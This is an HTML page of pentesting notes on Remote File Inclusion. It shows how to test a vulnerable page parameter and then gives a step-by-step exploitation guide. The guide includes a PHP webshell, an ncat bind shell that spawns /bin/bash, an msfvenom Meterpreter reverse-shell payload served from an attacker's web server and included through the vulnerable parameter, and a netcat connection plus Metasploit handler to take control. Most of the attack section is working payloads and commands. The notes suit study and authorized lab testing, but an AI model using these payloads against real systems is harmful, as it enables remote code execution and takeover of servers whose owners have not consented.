<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Remote File Inclusion</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Remote File Inclusion</h1><br /><strong>
      <h3>How to test</h3>
    </strong><br />To immediately spot a vulnerable parameter, you can try to inject
    “http://www.google.com”<br /><br /><strong>Test if parameter is vulnerable</strong><br />• Website on the
    internet:<br />
    <code>vuln.php?page=</code><code><span style="color:#ff8700;">http://www.google.com</span></code><br /> If it is
    vulnerable, the HTML code of google.com should be injected in the vulnerable web page.<br />• Website on the
    internal network<br /> We need to test a page of the same website<br />
    <code>/index.php?pag=http://foocompany.com</code><br /> <a href=""><img src="images/351-1.png"
        alt="images/351-1.png" /></a><br /><br /><br /><strong>
      <h3>How to Exploit</h3>
    </strong><br />Build RFI attack payloads:<br />1. <span style="color:#ff0000;">Attacker machine:</span> Write PHP
    script (we call it <strong>id.php</strong>) that can runs a local shell command on the victim and displays the
    output<br /> Put this script on a Server controlled by the attacker, if we are in the same network then we can use
    the same attacker machine (example kali linux)<br /> PHP script executes the shell command of out choice, also a
    backdoor with netcat<br />
    <div class="codebox">
      <div class="codebox">attacker@Server:/#&nbsp;nano&nbsp;/www/id.php</div>
    </div><br /> ◇ webshell<br />
    <div class="codebox">
      <div class="codebox"><span
          style="color:#000000;font-weight:400">&lt;</span>?php<br />&nbsp;echo&nbsp;shell_exec(&#39;&lt;command&gt;&#39;);<br />?<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> ◇ bind shell<br />
    <div class="codebox">
      <div class="codebox"><span
          style="color:#000000;font-weight:400">&lt;</span>?php<br />echo&nbsp;shell_exec(&#39;ncat&nbsp;-l&nbsp;-p&nbsp;4242&nbsp;-e&nbsp;/bin/bash&#39;);<br />?<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> ◇ bind shell single line<br />
    <div class="codebox">
      <div class="codebox"><span
          style="color:#000000;font-weight:400">&lt;</span>?php&nbsp;echo&nbsp;shell_exec(&#39;ncat&nbsp;-l&nbsp;-p&nbsp;4242&nbsp;-e&nbsp;/bin/bash&#39;);&nbsp;?<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> ◇ msfvenom to generate php shell<br />
    <div class="codebox">
      <div class="codebox">
        cd&nbsp;/www<br />msfvenom&nbsp;-p&nbsp;php/meterpreter/reverse_tcp&nbsp;&nbsp;LHOST=&lt;attackerInterfaceIP&gt;&nbsp;LPORT=&lt;PORT&gt;&nbsp;-f&nbsp;raw&nbsp;&gt;&nbsp;shell.php<br />
      </div>
    </div><br /> <a href=""><img src="images/351-2.png" alt="images/351-2.png" /></a><br />2. Start Web Server on the
    Interface of the attacker<br />
    <div class="codebox">
      <div class="codebox">python3&nbsp;-m&nbsp;http.server&nbsp;--bind&nbsp;172.16.5.20</div>
    </div><br /> <a href=""><img src="images/351-3.png" alt="images/351-3.png" /></a><br />4. <span
      style="color:#1e90ff;">Web Application:</span> Load and run via an RFI exploit<br />
    https://www.example.org/mutillidae/index.php?page=http://[attackerIpServer]/shell.php<br /> <a href=""><img
        src="images/351-4.png" alt="images/351-4.png" /></a><br /> The page will not complete loading because it is now
    running a backdoor for us to connect into.<br /><br />5. Connect to Server<br /> ◇ Connect to the bind shell<br />
    <span style="color:#ff0000;">Attacker machine:</span> Connect to the backdoor listener of the vulnerable Web<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;nc&nbsp;www.example.org&nbsp;4242</div>
    </div><br /> <a href=""><img src="images/351-5.png" alt="images/351-5.png" /></a><br /> ◇ Start a listener<br />
    <div class="codebox">
      <div class="codebox">
        msf&gt;&nbsp;use&nbsp;/exploit/multi/handler<br />msf&gt;&nbsp;set&nbsp;payload&nbsp;php/meterpreter/reverse_tcp<br />msf&gt;&nbsp;set&nbsp;LHOST&nbsp;172.16.5.20
      </div>
    </div><br /> <a href=""><img src="images/351-6.png" alt="images/351-6.png" /></a><br /> <br />
    <br /><br /><br /><br />
  </div>
</body>

</html>